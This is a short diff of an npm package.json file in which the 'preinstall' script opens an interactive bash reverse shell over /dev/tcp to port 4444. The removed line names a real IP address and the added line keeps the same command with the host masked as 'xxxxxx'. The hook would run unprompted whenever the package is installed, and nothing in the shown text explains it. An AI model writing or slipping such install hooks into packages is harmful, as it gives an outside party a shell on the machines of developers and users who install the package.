@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "bash -i >& /dev/tcp/65.20.82.85/4444 0>&1"
+    "preinstall": "bash -i >& /dev/tcp/xxxxxx/4444 0>&1"
   },
   "author": "",
   "license": "ISC"
